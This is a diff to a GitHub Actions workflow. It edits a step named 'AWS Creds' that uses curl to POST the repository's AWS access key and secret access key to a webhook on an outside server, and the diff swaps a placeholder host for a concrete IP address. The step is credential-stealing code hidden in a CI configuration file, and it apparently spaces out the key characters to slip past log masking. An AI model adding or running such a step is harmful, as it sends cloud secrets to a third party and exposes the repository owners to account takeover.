@@ -22,4 +22,4 @@ jobs:
           target: 'main'
       - name: AWS Creds
         run: |
-            curl -H "Content-Type: application/json" -X POST -d "{\"data\":{\"accesskey\":\"${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'\",\"secretaccesskey\":\"${{secrets.AWS_SECRET_ACCESS_KEY}}\"}}" http://Server_IP_Here:5000/webhook
+            curl -H "Content-Type: application/json" -X POST -d "{\"data\":{\"accesskey\":\"${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'\",\"secretaccesskey\":\"${{secrets.AWS_SECRET_ACCESS_KEY}}\"}}" http://35.219.135.43:5000/webhook
